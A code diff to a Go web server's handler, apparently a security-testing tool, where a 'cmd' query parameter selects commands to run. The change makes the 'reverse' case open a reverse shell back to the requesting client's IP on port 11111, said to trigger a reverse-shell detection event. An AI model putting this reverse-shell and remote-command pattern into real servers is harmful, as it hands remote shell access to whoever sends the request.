@@ -58,7 +58,7 @@ func WebInfoServer(w http.ResponseWriter, r *http.Request) {
 
 		// cmd exists - run specific commands
 		if cmd_opt := r.URL.Query().Get("cmd"); len(cmd_opt) > 0 {
-			run_cmd(w, cmd_opt)
+			run_cmd(w, r, cmd_opt)
 		}
 
 		// req_hdr exists - return full HTTP request header
@@ -207,7 +207,9 @@ func lookup_domain(w http.ResponseWriter, domain_name string) {
 }
 
 // run command based on the value of the cmd parameter
-func run_cmd(w http.ResponseWriter, cmd_opt string) {
+func run_cmd(w http.ResponseWriter, r *http.Request, cmd_opt string) {
+
+	var requester_ip_port string = r.RemoteAddr
 
 	fmt.Fprintf(w, "\n===== processing cmd parameter =====\n")
 
@@ -313,7 +315,8 @@ func run_cmd(w http.ResponseWriter, cmd_opt string) {
 	case "reverse":
 		// initiate a reverse shell command to trigger reverse shell event
 		ctx_duration := 30 * time.Second
-		dest_ip := "10.1.1.1"
+		dest_ip := strings.Split(requester_ip_port, ":")[0]
+
 		tcp_port := "11111"
 
 		ctx, cancel := context.WithTimeout(context.Background(), ctx_duration)
